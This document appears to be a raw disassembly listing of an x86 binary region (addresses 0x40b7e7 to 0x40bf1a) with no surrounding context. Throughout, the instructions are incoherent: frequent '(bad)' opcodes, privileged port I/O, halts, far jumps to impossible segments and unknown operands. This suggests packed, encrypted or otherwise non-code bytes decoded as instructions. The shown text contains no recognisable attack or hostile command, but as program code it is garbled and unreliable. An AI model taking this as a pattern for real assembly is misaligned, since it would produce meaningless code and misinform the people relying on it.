  40b7e7:	cmp    BYTE PTR ss:[eax-0x769c6de0],cl
  40b7ee:	scas   eax,DWORD PTR es:[edi]
  40b7ef:	popa   
  40b7f0:	icebp  
  40b7f1:	sahf   
  40b7f2:	neg    DWORD PTR [ebp+0x4d0a7abe]
  40b7f8:	dec    esi
  40b7f9:	ficomp DWORD PTR [eax]
  40b7fb:	dec    esi
  40b7fc:	fsub   st,st(3)
  40b7fe:	adc    eax,0x26060530
  40b803:	adc    BYTE PTR [edx-0x39],dh
  40b806:	inc    eax
  40b807:	mov    ebp,DWORD PTR [ebx+0x37e65880]
  40b80d:	mov    ds:0x1f346468,eax
  40b812:	or     DWORD PTR [ebp-0xe],esi
  40b815:	icebp  
  40b816:	add    DWORD PTR [ebp+eax*8-0x52],ebx
  40b81a:	sti    
  40b81b:	int    0x88
  40b81d:	jg     0x40b801
  40b81f:	ret    0xce08
  40b822:	je     0x40b7f4
  40b824:	inc    ecx
  40b825:	les    esp,FWORD PTR [ebx]
  40b827:	popf   
  40b828:	imul   BYTE PTR [edx+ebp*2-0x7]
  40b82c:	xor    dl,al
  40b82e:	jns    0x40b8a2
  40b830:	mov    ecx,0x5ac12600
  40b835:	cmp    BYTE PTR [edx],dh
  40b837:	pop    ds
  40b838:	arpl   si,si
  40b83a:	rcl    DWORD PTR [edi-0x23d4f36f],0x18
  40b841:	test   eax,0xef6dcc3f
  40b846:	(bad)  
  40b847:	or     dl,al
  40b849:	jp     0x40b897
  40b84b:	clc    
  40b84c:	xor    esi,DWORD PTR [edi]
  40b84e:	mov    dl,0xb7
  40b850:	fisttp QWORD PTR [edi-0x2a3798b2]
  40b856:	(bad)  
  40b857:	jne    0x40b817
  40b859:	cmp    BYTE PTR [ebp+0x1e],cl
  40b85c:	mov    bh,0xe9
  40b85e:	retf   
  40b85f:	push   ecx
  40b860:	sbb    eax,0x8aafcdc1
  40b865:	sbb    al,0xf3
  40b867:	(bad)  
  40b869:	ds mov bh,0xbf
  40b86c:	mov    ebx,0x9e4ba937
  40b871:	cmp    dh,BYTE PTR [eax+0x71]
  40b874:	jns    0x40b80b
  40b876:	xor    eax,DWORD PTR [edi]
  40b878:	cdq    
  40b879:	xchg   esi,eax
  40b87a:	or     al,0xc0
  40b87c:	mov    eax,ds:0xdf1c55cf
  40b881:	rcr    BYTE PTR [edi-0x1707c803],cl
  40b887:	sti    
  40b888:	out    0xf8,eax
  40b88a:	inc    ebx
  40b88b:	pop    eax
  40b88c:	fiadd  WORD PTR [esi-0x55]
  40b88f:	mov    ebp,0x28033e19
  40b894:	std    
  40b895:	in     al,dx
  40b896:	mov    edx,0xf2af70d7
  40b89b:	aam    0xdf
  40b89d:	xchg   ax,ax
  40b89f:	jg     0x40b8af
  40b8a1:	xchg   ebp,eax
  40b8a2:	scas   eax,DWORD PTR es:[edi]
  40b8a3:	leave  
  40b8a4:	pop    ecx
  40b8a5:	lods   eax,DWORD PTR ds:[esi]
  40b8a6:	pop    ss
  40b8a7:	das    
  40b8a8:	fmul   QWORD PTR [edx+edi*1+0x8]
  40b8ac:	add    cl,BYTE PTR [ebp-0x224a9e70]
  40b8b2:	jae    0x40b885
  40b8b4:	push   esp
  40b8b5:	dec    esp
  40b8b6:	fcomp  QWORD PTR [ecx+0x1086810e]
  40b8bc:	retf   
  40b8bd:	sub    esp,DWORD PTR [ecx-0x58]
  40b8c0:	popa   
  40b8c1:	hlt    
  40b8c2:	shl    BYTE PTR [esi-0x2d875b1],1
  40b8c8:	push   edi
  40b8c9:	mov    ah,0x53
  40b8cb:	lods   eax,DWORD PTR ds:[esi]
  40b8cc:	(bad)  
  40b8cd:	dec    esi
  40b8ce:	pop    ds
  40b8cf:	xor    esi,ebp
  40b8d1:	xchg   esi,eax
  40b8d2:	inc    ecx
  40b8d3:	push   esp
  40b8d4:	and    BYTE PTR [esp+ebx*4],0xc3
  40b8d8:	xchg   ebp,eax
  40b8d9:	je     0x40b8f4
  40b8db:	push   eax
  40b8dc:	fidiv  WORD PTR [eax]
  40b8de:	sbb    BYTE PTR ds:0x6a6f87bd,al
  40b8e4:	mov    al,ds:0xa9079716
  40b8e9:	imul   esp,edi,0xa17d58ef
  40b8ef:	cmp    BYTE PTR ds:0xee73da85,bl
  40b8f5:	ds cmp eax,0x908e7cf8
  40b8fb:	sub    al,0xc8
  40b8fd:	aam    0x58
  40b8ff:	jb     0x40b8aa
  40b901:	jne    0x40b8cc
  40b903:	mov    ecx,0xbc591805
  40b908:	mov    eax,DWORD PTR [ecx+0x75c14e0a]
  40b90e:	test   BYTE PTR [ebx+0x7cb58e2],ch
  40b914:	xchg   esp,eax
  40b915:	mov    ds:0x4a4e1535,al
  40b91a:	cli    
  40b91b:	pop    edi
  40b91c:	or     BYTE PTR [ebx+0x7366066b],bh
  40b922:	mov    esi,0x78fc8d8f
  40b927:	stos   BYTE PTR es:[edi],al
  40b928:	mov    esp,0xba1b261b
  40b92d:	in     eax,dx
  40b92e:	int    0x27
  40b930:	xor    al,0xdb
  40b932:	sub    BYTE PTR [esi-0x11dec31],al
  40b938:	out    0xb5,eax
  40b93a:	ins    DWORD PTR es:[edi],dx
  40b93b:	adc    dh,BYTE PTR [ecx+0x263adfec]
  40b941:	dec    ebp
  40b942:	xor    al,0xb9
  40b944:	mov    ecx,0xcacf75f4
  40b949:	imul   ebp,DWORD PTR [esi+ebx*4],0x6f
  40b94d:	adc    eax,0xad437f1c
  40b952:	xor    al,0x7e
  40b954:	xor    dl,BYTE PTR [edi-0x50812b62]
  40b95a:	(bad)  
  40b95b:	cdq    
  40b95c:	cmpps  xmm2,XMMWORD PTR [eax],0x8c
  40b960:	test   al,0x9e
  40b962:	and    DWORD PTR [ebp+edi*4+0x73],esp
  40b966:	sbb    DWORD PTR [ecx-0x70d83fe4],ecx
  40b96c:	jnp    0x40b9b7
  40b96e:	sub    DWORD PTR [edi],esi
  40b970:	leave  
  40b971:	xor    cl,BYTE PTR [ecx+ebx*4]
  40b974:	mov    ebp,0x264321c8
  40b979:	retf   0x102f
  40b97c:	add    eax,0xca0382e4
  40b981:	and    ecx,DWORD PTR [eax]
  40b983:	xchg   edi,eax
  40b984:	jecxz  0x40b968
  40b986:	ins    DWORD PTR es:[edi],dx
  40b987:	out    dx,eax
  40b988:	xor    DWORD PTR [ebx+ebp*1+0x18],esi
  40b98c:	test   eax,0x6b1d0ba3
  40b991:	fldcw  WORD PTR [ebx]
  40b993:	sub    DWORD PTR [esi],ecx
  40b995:	sbb    eax,0xef2fcc75
  40b99a:	fwait
  40b99b:	and    al,0xca
  40b99d:	outs   dx,BYTE PTR ds:[esi]
  40b99e:	stos   BYTE PTR es:[edi],al
  40b99f:	push   ecx
  40b9a0:	stos   DWORD PTR es:[edi],eax
  40b9a1:	jmp    0x40ba08
  40b9a3:	inc    ecx
  40b9a4:	sbb    al,0xc0
  40b9a6:	inc    ebp
  40b9a7:	dec    ebp
  40b9a8:	or     bl,BYTE PTR [ebp+0x54]
  40b9ab:	jl     0x40b9a4
  40b9ad:	lahf   
  40b9ae:	lods   al,BYTE PTR ds:[esi]
  40b9af:	(bad)  
  40b9b1:	dec    ebp
  40b9b2:	les    eax,FWORD PTR [ebp+0x607c446f]
  40b9b8:	in     al,dx
  40b9b9:	ins    BYTE PTR es:[edi],dx
  40b9ba:	out    0x47,al
  40b9bc:	test   eax,0xff190e09
  40b9c1:	and    al,0x37
  40b9c3:	sar    DWORD PTR [eax],cl
  40b9c5:	outs   dx,DWORD PTR ds:[esi]
  40b9c6:	dec    esp
  40b9c7:	aas    
  40b9c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9c9:	pop    esi
  40b9ca:	mov    ebp,0x72161e9b
  40b9cf:	push   ds
  40b9d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9d1:	pop    edx
  40b9d2:	mov    edx,0x6b89e167
  40b9d7:	mov    ds:0x3d016d8c,al
  40b9dc:	in     al,dx
  40b9dd:	repnz xchg ebp,eax
  40b9df:	xor    esp,DWORD PTR [esi+0x6c]
  40b9e2:	scas   al,BYTE PTR es:[edi]
  40b9e3:	xor    BYTE PTR [edi-0x2],dh
  40b9e6:	cli    
  40b9e7:	jae    0x40b9ea
  40b9e9:	inc    ebx
  40b9ea:	push   edx
  40b9eb:	dec    eax
  40b9ec:	into   
  40b9ed:	adc    DWORD PTR [eax-0x14],ecx
  40b9f0:	sbb    DWORD PTR [eax+0x6137c3ca],esi
  40b9f6:	and    ecx,edx
  40b9f8:	dec    edx
  40b9f9:	loopne 0x40b9a8
  40b9fb:	inc    ebx
  40b9fc:	push   ecx
  40b9fd:	ja     0x40ba10
  40b9ff:	xor    al,0xd0
  40ba01:	push   esp
  40ba02:	mov    bl,BYTE PTR [edx]
  40ba04:	mov    dl,0x13
  40ba06:	fcomp  DWORD PTR [ebp+0x9592c30]
  40ba0c:	mov    ebx,0xde845222
  40ba11:	sti    
  40ba12:	ds popf 
  40ba14:	mov    dl,0x60
  40ba16:	lock push cs
  40ba18:	adc    al,BYTE PTR [edi+ebp*4]
  40ba1b:	or     al,0x67
  40ba1d:	rcl    BYTE PTR [ebx],0x4
  40ba20:	addr16 cdq 
  40ba22:	hlt    
  40ba23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba24:	adc    bh,BYTE PTR [edx+0x7e80a506]
  40ba2a:	cdq    
  40ba2b:	dec    esp
  40ba2c:	dec    esi
  40ba2d:	xchg   DWORD PTR [edi-0x379eb83a],esi
  40ba33:	fsubrp st(2),st
  40ba35:	jecxz  0x40ba82
  40ba37:	inc    edi
  40ba38:	mov    ch,cl
  40ba3a:	xchg   DWORD PTR [ebp+0x1b1b69fd],esp
  40ba40:	mov    al,0x20
  40ba42:	push   es
  40ba43:	ret    
  40ba44:	jp     0x40ba5e
  40ba46:	xlat   BYTE PTR ds:[ebx]
  40ba47:	add    esi,DWORD PTR [ebx+0x25]
  40ba4a:	jl     0x40ba29
  40ba4c:	rcr    BYTE PTR [ebx+0x1aac3df],0xb
  40ba53:	je     0x40b9fb
  40ba55:	fild   WORD PTR [eax]
  40ba57:	outs   dx,BYTE PTR ds:[esi]
  40ba58:	es jle 0x40ba8a
  40ba5b:	pop    esi
  40ba5c:	fdiv   QWORD PTR [edi-0x33]
  40ba5f:	and    al,0x9
  40ba61:	mov    dl,0x1d
  40ba63:	int3   
  40ba64:	pop    ebp
  40ba65:	inc    ebx
  40ba66:	int    0xab
  40ba68:	int3   
  40ba69:	mov    eax,0xc0004d4e
  40ba6f:	mov    eax,ds:0x1e8e0f68
  40ba74:	mov    fs,WORD PTR [ebx+esi*4-0x4f7aac67]
  40ba7b:	bound  esp,QWORD PTR [eax-0x72309861]
  40ba81:	adc    cl,BYTE PTR [edi+0x34]
  40ba84:	add    eax,0xa73adb86
  40ba89:	lahf   
  40ba8a:	das    
  40ba8b:	pop    esp
  40ba8c:	clc    
  40ba8d:	lods   eax,DWORD PTR ds:[esi]
  40ba8e:	jno    0x40ba51
  40ba90:	or     al,0x44
  40ba92:	inc    edx
  40ba93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba94:	sub    bl,bh
  40ba96:	xor    DWORD PTR [ebx-0x53771da6],ebx
  40ba9c:	jnp    0x40ba56
  40ba9e:	mov    cl,0xd6
  40baa0:	lds    eax,FWORD PTR [esi+0x26]
  40baa3:	popf   
  40baa4:	out    0xbb,al
  40baa6:	jae    0x40ba37
  40baa8:	dec    esi
  40baa9:	add    BYTE PTR [edx-0x4c],dl
  40baac:	add    DWORD PTR [eax+0x6f4f0191],0x1a44072c
  40bab6:	inc    esp
  40bab7:	xchg   ebp,eax
  40bab8:	outs   dx,BYTE PTR ds:[esi]
  40bab9:	pop    edi
  40baba:	cwde   
  40babb:	mov    ds:0xdf09843e,al
  40bac0:	mov    ss,WORD PTR [ebx]
  40bac2:	push   edi
  40bac3:	sbb    bl,BYTE PTR [edx+0x46]
  40bac6:	adc    cl,BYTE PTR [ecx-0x5]
  40bac9:	pop    edx
  40baca:	dec    ebx
  40bacb:	popa   
  40bacc:	daa    
  40bacd:	retf   0x63e1
  40bad0:	sbb    BYTE PTR [edx-0x7],0xa3
  40bad4:	mov    ecx,0xf8fc739b
  40bad9:	add    ah,BYTE PTR [eax-0x72]
  40badc:	jb     0x40bb50
  40bade:	mov    cl,0x3d
  40bae0:	loope  0x40bafc
  40bae2:	std    
  40bae3:	jne    0x40bb3c
  40bae5:	xor    BYTE PTR [eax+0x78cb3654],dl
  40baeb:	das    
  40baec:	mov    ds:0x7b85588d,al
  40baf1:	(bad)  
  40baf2:	neg    DWORD PTR [edx*1-0x251dde14]
  40baf9:	fldcw  WORD PTR [esi+eiz*1-0x3f29e65c]
  40bb00:	mov    ch,0xed
  40bb02:	pop    esp
  40bb03:	sahf   
  40bb04:	int    0x88
  40bb06:	in     al,dx
  40bb07:	dec    edx
  40bb08:	shl    BYTE PTR [esi+0x341e7982],1
  40bb0e:	jo     0x40bb73
  40bb10:	mov    edx,0x3db172e8
  40bb15:	sbb    BYTE PTR [eax+0x6e974994],al
  40bb1b:	jle    0x40bb1c
  40bb1d:	inc    esp
  40bb1e:	or     BYTE PTR [ebx-0xa6d4b2e],dl
  40bb24:	(bad)  
  40bb25:	js     0x40bb09
  40bb27:	lahf   
  40bb28:	mov    esp,0x7ba58b3d
  40bb2d:	into   
  40bb2e:	sub    DWORD PTR [edx],edx
  40bb30:	push   ds
  40bb31:	mov    ecx,0x7ad620b9
  40bb36:	xor    al,0x87
  40bb38:	cs mov dl,0x6a
  40bb3b:	mov    bl,0xeb
  40bb3d:	xor    ebp,DWORD PTR [esi-0x2f8da24e]
  40bb43:	pusha  
  40bb44:	mov    eax,ds:0x878564b6
  40bb49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb4a:	push   ecx
  40bb4b:	dec    eax
  40bb4c:	xchg   edx,eax
  40bb4d:	dec    esp
  40bb4e:	mov    ecx,edx
  40bb50:	(bad)  
  40bb51:	popa   
  40bb52:	jns    0x40bb29
  40bb54:	aaa    
  40bb55:	inc    ecx
  40bb56:	out    0x57,al
  40bb58:	mov    WORD PTR [edi-0x4c],ds
  40bb5b:	xchg   edi,eax
  40bb5c:	cmp    DWORD PTR [ebp+0x68f6c673],esp
  40bb62:	scas   al,BYTE PTR es:[edi]
  40bb63:	jo     0x40bbab
  40bb65:	cmp    eax,0x7f9ad492
  40bb6a:	aad    0xd0
  40bb6c:	cmp    si,WORD PTR [esi]
  40bb6f:	mov    bl,0x2a
  40bb71:	sub    ecx,esp
  40bb73:	test   BYTE PTR [esi+ebp*8-0x34],ah
  40bb77:	jmp    0x40bba3
  40bb79:	or     al,0x95
  40bb7b:	xchg   cl,cl
  40bb7d:	shr    bl,cl
  40bb7f:	mov    cl,0xe4
  40bb81:	add    DWORD PTR [ebx],eax
  40bb83:	stc    
  40bb84:	repz sub DWORD PTR [ebp-0x6b],edx
  40bb88:	xor    cl,BYTE PTR [ebx]
  40bb8a:	xchg   al,bl
  40bb8c:	or     eax,0x55b7c145
  40bb91:	loope  0x40bb6d
  40bb93:	pop    ebx
  40bb94:	ins    BYTE PTR es:[edi],dx
  40bb95:	jo     0x40bb73
  40bb97:	mov    WORD PTR [ecx],gs
  40bb99:	loopne 0x40bbfa
  40bb9b:	inc    eax
  40bb9c:	push   eax
  40bb9d:	fimul  WORD PTR [ebx-0x2f51cc19]
  40bba3:	dec    esp
  40bba4:	imul   ebx,DWORD PTR [ecx-0x4d],0x3a
  40bba8:	or     DWORD PTR [ecx+0xf],esi
  40bbab:	mov    al,0xb0
  40bbad:	mov    ?,WORD PTR [edx]
  40bbaf:	int    0x84
  40bbb1:	push   ecx
  40bbb2:	aas    
  40bbb3:	fwait
  40bbb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbb5:	arpl   ax,ax
  40bbb7:	sub    al,0xce
  40bbb9:	mov    fs,WORD PTR [ebx+edi*2-0x7671237b]
  40bbc0:	repnz or al,0x37
  40bbc3:	or     BYTE PTR [ecx],0x7a
  40bbc6:	dec    edx
  40bbc7:	mov    edi,0xd949017c
  40bbcc:	sbb    eax,0x448c15d8
  40bbd1:	icebp  
  40bbd2:	stos   DWORD PTR es:[edi],eax
  40bbd3:	retf   0x5b51
  40bbd6:	icebp  
  40bbd7:	jecxz  0x40bb68
  40bbd9:	or     BYTE PTR [edx+0x20],al
  40bbdc:	mov    esi,0x807c113e
  40bbe1:	and    edx,esp
  40bbe3:	adc    ebp,ecx
  40bbe5:	add    DWORD PTR [edi-0x5c0755c8],0x76
  40bbec:	cmp    BYTE PTR ds:0xdf7a5f05,dl
  40bbf2:	push   ss
  40bbf3:	pop    ss
  40bbf4:	std    
  40bbf5:	pop    es
  40bbf6:	popa   
  40bbf7:	mov    fs,WORD PTR [ebx-0x14]
  40bbfa:	outs   dx,DWORD PTR ds:[esi]
  40bbfb:	aas    
  40bbfc:	sub    BYTE PTR [edi],dl
  40bbfe:	jp     0x40bbbd
  40bc00:	lods   al,BYTE PTR ds:[esi]
  40bc01:	mov    cl,0xa8
  40bc03:	es ins BYTE PTR es:[edi],dx
  40bc05:	add    dh,0x4d
  40bc08:	pop    eax
  40bc09:	fistp  DWORD PTR [esi-0x40a9fa1f]
  40bc0f:	leave  
  40bc10:	(bad)  
  40bc11:	mov    ah,0xf4
  40bc13:	cmp    ebp,DWORD PTR cs:[ebp+0x3651bdb9]
  40bc1a:	inc    edi
  40bc1b:	je     0x40bbf6
  40bc1d:	ss repz sub eax,0xb1f446d0
  40bc24:	mov    ah,dh
  40bc26:	sbb    al,0x8d
  40bc28:	and    eax,0xca32c7fd
  40bc2d:	mov    eax,DWORD PTR [esi-0xa3ac7d4]
  40bc33:	dec    ebx
  40bc34:	push   cs
  40bc35:	cld    
  40bc36:	je     0x40bcb5
  40bc38:	dec    ebp
  40bc39:	jmp    0x40bcab
  40bc3b:	pop    esp
  40bc3c:	push   esi
  40bc3d:	call   0x6a26:0xeec092c5
  40bc44:	lds    ecx,FWORD PTR [ecx-0x2d]
  40bc47:	mov    ah,0xc3
  40bc49:	jg     0x40bc5b
  40bc4b:	push   es
  40bc4c:	sub    al,0x2f
  40bc4e:	xchg   ebp,eax
  40bc4f:	jb     0x40bbf6
  40bc51:	xchg   ecx,eax
  40bc52:	xor    DWORD PTR [ebp+0x71],ebx
  40bc55:	fmul   DWORD PTR [esi]
  40bc57:	fucom  st(5)
  40bc59:	sbb    eax,0xadf45b77
  40bc5e:	or     BYTE PTR [ecx-0x13],cl
  40bc61:	push   ebx
  40bc62:	push   ss
  40bc63:	mov    esp,0x70a1ed49
  40bc68:	jmp    0x4aa:0x4ceafada
  40bc6f:	ins    DWORD PTR es:[edi],dx
  40bc70:	xchg   ecx,eax
  40bc71:	sbb    cl,BYTE PTR [edi+edi*2-0x7b]
  40bc75:	xchg   BYTE PTR [edx],ah
  40bc77:	pop    edx
  40bc78:	sbb    bl,ah
  40bc7a:	jecxz  0x40bc84
  40bc7c:	pop    es
  40bc7d:	dec    edx
  40bc7e:	int3   
  40bc7f:	push   ss
  40bc80:	xchg   ebx,eax
  40bc81:	lea    esi,[edx-0x2c]
  40bc84:	(bad)  
  40bc85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc86:	ins    BYTE PTR es:[edi],dx
  40bc87:	xor    edi,edx
  40bc89:	int    0x73
  40bc8b:	hlt    
  40bc8c:	sbb    al,0x24
  40bc8e:	jecxz  0x40bc56
  40bc90:	mov    dl,0xcb
  40bc92:	xor    eax,0xe4c72513
  40bc97:	mov    ds:0x8f7f9635,al
  40bc9c:	add    bl,BYTE PTR [edx-0x5db232fd]
  40bca2:	mov    dl,0xa4
  40bca4:	aam    0x9
  40bca6:	and    eax,0x72f6bba2
  40bcab:	pop    ss
  40bcac:	sub    eax,edx
  40bcae:	(bad)  
  40bcb0:	in     al,0x1e
  40bcb2:	jbe    0x40bc74
  40bcb4:	mov    edx,0x6a26e48e
  40bcb9:	jmp    0x166150dd
  40bcbe:	sub    DWORD PTR [ebx+0x27],edx
  40bcc1:	(bad)
  40bcc4:	or     esi,DWORD PTR [edx]
  40bcc6:	inc    eax
  40bcc7:	outs   dx,DWORD PTR ds:[esi]
  40bcc8:	out    0xde,eax
  40bcca:	fs imul edx,edx,0xffffffb6
  40bcce:	sub    eax,0xe81aefa1
  40bcd3:	adc    DWORD PTR [edi],edx
  40bcd5:	aaa    
  40bcd6:	mov    bh,0x3b
  40bcd8:	dec    esp
  40bcd9:	out    dx,al
  40bcda:	mov    dl,BYTE PTR [edi+0x359248ad]
  40bce0:	pop    ebp
  40bce1:	js     0x40bcb2
  40bce3:	push   cs
  40bce4:	jo     0x40bd4f
  40bce6:	pusha  
  40bce7:	mov    DWORD PTR [ebp-0x20b0765f],ebp
  40bced:	push   cs
  40bcee:	pop    ebx
  40bcef:	out    0x40,eax
  40bcf1:	imul   ebp,DWORD PTR [ebp+0x5d2b2459],0x11b8b203
  40bcfb:	stos   BYTE PTR es:[edi],al
  40bcfc:	xor    edx,DWORD PTR [edi+0x58039b04]
  40bd02:	addr16 jnp 0x40bcef
  40bd05:	in     eax,0x40
  40bd07:	and    BYTE PTR [ebx+0x28920fcd],bl
  40bd0d:	xor    ah,BYTE PTR [edi-0x5aa8214f]
  40bd13:	loop   0x40bce3
  40bd15:	or     bh,cl
  40bd17:	mov    ebx,0x98d897ba
  40bd1c:	clc    
  40bd1d:	pushw  0x1a
  40bd20:	xor    eax,0x4e456f08
  40bd25:	int3   
  40bd26:	sbb    esp,DWORD PTR [eax]
  40bd28:	mov    dl,0x7e
  40bd2a:	add    dl,BYTE PTR [ebx+0x21daa985]
  40bd30:	add    cl,BYTE PTR [ecx-0x1c702688]
  40bd36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd37:	lock xor eax,0xcee47676
  40bd3d:	popf   
  40bd3e:	out    0x30,eax
  40bd40:	bndstx [eax],(bad)
  40bd43:	xchg   edx,eax
  40bd44:	mov    ch,0x0
  40bd46:	sub    BYTE PTR ds:0xd6ed3e32,al
  40bd4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd4d:	jp     0x40bce9
  40bd4f:	jbe    0x40bd0f
  40bd51:	ja     0x40bd14
  40bd53:	ret    0xcb20
  40bd56:	lods   eax,DWORD PTR ds:[esi]
  40bd57:	lock dec ebx
  40bd59:	fisttp DWORD PTR [eax*4+0x1d2eca7]
  40bd60:	mov    cl,0x7e
  40bd62:	xor    ebx,edx
  40bd64:	jmp    0x2412:0xf7d1b4bd
  40bd6b:	mov    eax,0xa1f36aa2
  40bd70:	mov    ecx,0x27f096e3
  40bd75:	aaa    
  40bd76:	cmp    al,0xd5
  40bd78:	sbb    bh,BYTE PTR [ecx-0x5a]
  40bd7b:	lahf   
  40bd7c:	sub    cl,BYTE PTR [ebp+ebx*8-0x9]
  40bd80:	cdq    
  40bd81:	xchg   edx,eax
  40bd82:	gs push cs
  40bd84:	push   ebp
  40bd85:	push   eax
  40bd86:	cmova  edi,ecx
  40bd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd8a:	retf   
  40bd8b:	mov    WORD PTR [esi+0x719152b2],?
  40bd91:	mov    esp,0xaef236c4
  40bd96:	cmp    esp,DWORD PTR [esi+0x3c]
  40bd99:	(bad)  
  40bd9a:	adc    cl,ah
  40bd9c:	jl     0x40bdf1
  40bd9e:	test   BYTE PTR [eax],dl
  40bda0:	pop    edi
  40bda1:	push   edi
  40bda2:	mov    WORD PTR [ebp-0x88510e9],?
  40bda8:	mov    gs,WORD PTR [ebp+eiz*1-0x20]
  40bdac:	jl     0x40be04
  40bdae:	pop    ds
  40bdaf:	cmp    BYTE PTR [edi],dl
  40bdb1:	adc    eax,DWORD PTR [ecx]
  40bdb3:	in     eax,dx
  40bdb4:	mov    ch,0x25
  40bdb6:	push   es
  40bdb7:	ret    0xcfa9
  40bdba:	stc    
  40bdbb:	inc    ebp
  40bdbc:	ret    0x1701
  40bdbf:	les    esp,FWORD PTR [eax]
  40bdc1:	inc    esi
  40bdc2:	xor    eax,0xd9a6d4fa
  40bdc7:	pop    ecx
  40bdc8:	pop    ds
  40bdc9:	hlt    
  40bdca:	dec    esp
  40bdcb:	and    DWORD PTR [esp+edi*4+0x5580999e],ecx
  40bdd2:	ds out dx,al
  40bdd4:	js     0x40be40
  40bdd6:	xor    esp,esi
  40bdd8:	scas   al,BYTE PTR es:[edi]
  40bdd9:	sbb    edx,esi
  40bddb:	jg     0x40bdee
  40bddd:	sub    al,0xfc
  40bddf:	adc    esp,DWORD PTR [eax]
  40bde1:	out    dx,al
  40bde2:	arpl   si,di
  40bde4:	imul   DWORD PTR [ebx+0x445ee7dd]
  40bdea:	and    edx,eax
  40bdec:	inc    esi
  40bded:	and    eax,0x2418fa95
  40bdf2:	ror    DWORD PTR [esp+ebx*2],0x18
  40bdf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdf7:	push   0xfac18c26
  40bdfc:	nop
  40bdfd:	sbb    DWORD PTR ds:0x5553ac9b,esi
  40be03:	aaa    
  40be04:	xchg   edx,eax
  40be05:	(bad)  
  40be06:	fst    DWORD PTR [edx-0x47]
  40be09:	test   DWORD PTR [ecx-0x71],ebp
  40be0c:	les    esp,FWORD PTR [ebp+0x5691ecd9]
  40be12:	cmc    
  40be13:	cli    
  40be14:	mov    bl,0xc4
  40be16:	add    edi,DWORD PTR [ecx]
  40be18:	jle    0x40be96
  40be1a:	xchg   esp,eax
  40be1b:	enter  0x5711,0xa
  40be1f:	push   ecx
  40be20:	sub    eax,0x8a78e0db
  40be25:	and    BYTE PTR [esp+edx*1+0x53],bh
  40be29:	dec    edx
  40be2a:	push   ebx
  40be2b:	test   al,0x42
  40be2d:	sahf   
  40be2e:	test   DWORD PTR [edx+0x4c],edi
  40be31:	je     0x40bdb8
  40be33:	lock test BYTE PTR ss:[ebx-0x6c],cl
  40be38:	scas   al,BYTE PTR es:[edi]
  40be39:	push   ecx
  40be3a:	test   BYTE PTR [ecx],dh
  40be3c:	stos   BYTE PTR es:[edi],al
  40be3d:	dec    esp
  40be3e:	jge    0x40bdf6
  40be40:	mov    edi,gs
  40be42:	xlat   BYTE PTR ds:[ebx]
  40be43:	stc    
  40be44:	mov    ah,0x6f
  40be46:	call   0x2d8a2fb3
  40be4b:	hlt    
  40be4c:	pop    esp
  40be4d:	sbb    BYTE PTR [edx+ecx*8+0x60],0xa7
  40be52:	mov    bl,0x51
  40be54:	inc    edi
  40be55:	jp     0x40bde6
  40be57:	inc    edx
  40be58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be59:	shr    BYTE PTR [edx],0x70
  40be5c:	aaa    
  40be5d:	and    DWORD PTR [eax-0x350ff6d8],ebx
  40be63:	fld    st(3)
  40be65:	dec    edx
  40be66:	pop    ecx
  40be67:	sub    dl,bl
  40be69:	cli    
  40be6a:	sbb    ebx,edx
  40be6c:	ins    DWORD PTR es:[edi],dx
  40be6d:	push   ecx
  40be6e:	dec    eax
  40be6f:	pop    esi
  40be70:	imul   edx,DWORD PTR [esi+0x28cd3977],0x4132d6be
  40be7a:	fucomp st(7)
  40be7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be7d:	pop    es
  40be7e:	and    ecx,ebx
  40be80:	and    al,0xb4
  40be82:	pop    ecx
  40be83:	sbb    ecx,eax
  40be85:	arpl   WORD PTR [esi],ax
  40be87:	or     BYTE PTR [eax+0x63],0xf8
  40be8b:	ins    BYTE PTR es:[edi],dx
  40be8c:	(bad)  
  40be8d:	fstp   DWORD PTR [ecx]
  40be8f:	int    0x75
  40be91:	outs   dx,BYTE PTR ds:[esi]
  40be92:	dec    eax
  40be93:	adc    BYTE PTR [edx-0x5913f184],bh
  40be99:	test   eax,0x1da3c94d
  40be9e:	std    
  40be9f:	rol    BYTE PTR [eax+0x29185b17],cl
  40bea5:	jno    0x40be60
  40bea7:	arpl   WORD PTR [eax-0x60872b87],bx
  40bead:	clc    
  40beae:	cld    
  40beaf:	sub    al,0x70
  40beb1:	aas    
  40beb2:	or     al,0x25
  40beb4:	(bad)  
  40beb5:	mov    eax,0x953bcd42
  40beba:	retf   
  40bebb:	inc    ebp
  40bebc:	retf   
  40bebd:	lods   al,BYTE PTR ds:[esi]
  40bebe:	adc    al,BYTE PTR [esi-0x289fd86f]
  40bec4:	ds in  eax,dx
  40bec6:	inc    esp
  40bec7:	dec    edx
  40bec8:	fsub   DWORD PTR [ebx]
  40beca:	jmp    0x73b148cf
  40becf:	or     eax,0x4a666807
  40bed4:	cmp    edx,edi
  40bed6:	push   esi
  40bed7:	ret    0x402f
  40beda:	iret   
  40bedb:	test   cl,ch
  40bedd:	inc    ebp
  40bede:	cmp    DWORD PTR [eax],ebx
  40bee0:	sub    DWORD PTR [ebp+esi*1-0x3a5b61af],edi
  40bee7:	in     eax,0x65
  40bee9:	jnp    0x40bf3c
  40beeb:	xchg   esi,eax
  40beec:	mov    al,ds:0xd90b72ee
  40bef1:	pop    esi
  40bef2:	enter  0x66b6,0xc2
  40bef6:	and    al,0xf3
  40bef8:	loopne 0x40beb0
  40befa:	addr16 test al,0x4a
  40befd:	sbb    BYTE PTR [ecx],ch
  40beff:	cmp    al,BYTE PTR [edx+0x50]
  40bf02:	push   eax
  40bf03:	outs   dx,BYTE PTR ds:[esi]
  40bf04:	sbb    esi,DWORD PTR [eax+0x389dcc2a]
  40bf0a:	call   0xf6f4:0xa421667a
  40bf11:	mov    dl,0xef
  40bf13:	jmp    0x7e3f:0x610ed7df
  40bf1a:	inc    dh
